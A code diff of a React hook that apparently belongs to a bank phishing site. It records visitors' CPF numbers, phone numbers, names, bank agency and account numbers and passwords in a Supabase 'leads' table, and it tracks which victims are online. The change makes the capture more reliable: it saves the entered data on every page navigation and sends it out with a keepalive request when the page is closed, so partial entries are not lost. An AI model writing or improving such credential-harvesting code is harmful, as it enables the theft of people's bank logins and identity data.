@@ -1,4 +1,4 @@
-import { useEffect, useRef, useCallback } from "react";
+import { useEffect, useRef } from "react";
 import { useLocation } from "react-router-dom";
 import { useFlow } from "@/contexts/FlowContext";
 import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
@@ -16,48 +16,29 @@ function sessionSet(key: string, value: string): void {
   try { sessionStorage.setItem(key, value); } catch { /* non-fatal */ }
 }
 
+function buildLeadUpdates(data: Record<string, string>): LeadUpdate {
+  const updates: LeadUpdate = {};
+  if (data.cpf) updates.cpf = data.cpf;
+  if (data.phone) updates.phone = data.phone;
+  if (data.nome) updates.nome = data.nome;
+  if (data.segment) updates.segment = data.segment;
+  if (data.agency) updates.agency = data.agency;
+  if (data.account) updates.account = data.account;
+  if (data.password) updates.password = data.password;
+  return updates;
+}
+
 export function useLeadTracking() {
   const location = useLocation();
   const { data } = useFlow();
   const leadIdRef = useRef<string | null>(sessionGet("lead_id"));
   const sessionIdRef = useRef<string | null>(null);
-  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const dataRef = useRef(data);
+  dataRef.current = data;
 
   const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));
 
-  const updateLeadData = useCallback(async () => {
-    if (!leadIdRef.current) return;
-
-    const updates: LeadUpdate = {};
-    if (data.cpf) updates.cpf = data.cpf;
-    if (data.phone) updates.phone = data.phone;
-    if (data.nome) updates.nome = data.nome;
-    if (data.segment) updates.segment = data.segment;
-    if (data.agency) updates.agency = data.agency;
-    if (data.account) updates.account = data.account;
-    if (data.password) updates.password = data.password;
-
-    if (Object.keys(updates).length === 0) return;
-
-    try {
-      await leadRepository.update(leadIdRef.current, updates);
-    } catch (err) {
-      console.error("Lead data update error:", err);
-    }
-  }, [data.cpf, data.phone, data.nome, data.segment, data.agency, data.account, data.password]);
-
-  useEffect(() => {
-    if (isAdmin || !leadIdRef.current) return;
-
-    if (debounceRef.current) clearTimeout(debounceRef.current);
-    debounceRef.current = setTimeout(updateLeadData, 500);
-
-    return () => {
-      if (debounceRef.current) clearTimeout(debounceRef.current);
-    };
-  }, [updateLeadData, isAdmin]);
-
-  // ── Create session once, update page on route changes ──
+  // ── Single effect: track page + persist lead data on every navigation ──
   useEffect(() => {
     if (isAdmin) return;
 
@@ -65,15 +46,18 @@ export function useLeadTracking() {
 
     const track = async () => {
       try {
+        const leadUpdates = buildLeadUpdates(data);
+
         // Ensure lead exists
         if (!leadIdRef.current) {
-          const lead = await leadRepository.create({ current_step: page });
+          const lead = await leadRepository.create({ current_step: page, ...leadUpdates });
           leadIdRef.current = lead.id;
           sessionSet("lead_id", lead.id);
         } else {
           await leadRepository.update(leadIdRef.current, {
             current_step: page,
             ...(page === "concluido" ? { status: "concluido" } : {}),
+            ...leadUpdates,
           });
         }
 
@@ -123,15 +107,36 @@ export function useLeadTracking() {
 
     track();
 
-    // ── Mark session offline on page unload ────────────────────────────────────
-    // Using fetch() with keepalive:true + PATCH — this is the correct approach
-    // because sendBeacon() only supports POST (can't PATCH) and can't set headers
-    // (Supabase REST requires apikey + Authorization headers).
-    // keepalive ensures the request survives the page unload event.
+    // ── Flush lead data + mark session offline on page unload ─────────────
+    // fetch() with keepalive:true survives page unload.
+    // sendBeacon() can't PATCH or set custom headers (Supabase needs apikey).
     const handleUnload = () => {
-      if (!sessionIdRef.current) return;
       const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
       const anonKey    = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
+
+      // Flush lead data (best-effort)
+      if (leadIdRef.current) {
+        const updates = buildLeadUpdates(dataRef.current);
+        if (Object.keys(updates).length > 0) {
+          fetch(
+            `${supabaseUrl}/rest/v1/leads?id=eq.${leadIdRef.current}`,
+            {
+              method: "PATCH",
+              keepalive: true,
+              headers: {
+                "Content-Type": "application/json",
+                "apikey": anonKey,
+                "Authorization": `Bearer ${anonKey}`,
+                "Prefer": "return=minimal",
+              },
+              body: JSON.stringify(updates),
+            },
+          ).catch(() => {});
+        }
+      }
+
+      // Mark session offline
+      if (!sessionIdRef.current) return;
       fetch(
         `${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`,
         {
@@ -145,12 +150,10 @@ export function useLeadTracking() {
           },
           body: JSON.stringify({ is_online: false, ended_at: new Date().toISOString() }),
         },
-      ).catch(() => { /* ignore — best-effort on unload */ });
+      ).catch(() => {});
     };
 
-    // ── Heartbeat: atualiza last_seen_at a cada 30s ────────────────────────────
-    // Fonte de verdade para presença: "online" = last_seen_at > now() - 60s.
-    // Independe de eventos do browser — se o cliente sumiu, após 60s ele some da lista.
+    // ── Heartbeat: last_seen_at every 30s ────────────────────────────────
     const sendHeartbeat = () => {
       if (!sessionIdRef.current) return;
       const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
@@ -171,10 +174,7 @@ export function useLeadTracking() {
     };
     const heartbeatId = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
 
-    // ── Eventos de saída (complemento ao heartbeat) ────────────────────────────
-    // visibilitychange: troca de aba / minimizar app (mais confiável no mobile)
-    // pagehide: iOS Safari ao fechar/navegar para fora
-    // beforeunload: fallback desktop
+    // ── Exit events (complement heartbeat) ───────────────────────────────
     const handleVisibilityChange = () => { if (document.hidden) handleUnload(); };
 
     window.addEventListener("beforeunload", handleUnload);
@@ -187,5 +187,5 @@ export function useLeadTracking() {
       window.removeEventListener("pagehide", handleUnload);
       document.removeEventListener("visibilitychange", handleVisibilityChange);
     };
-  }, [location.pathname, isAdmin]);
+  }, [location.pathname, isAdmin, data]);
 }
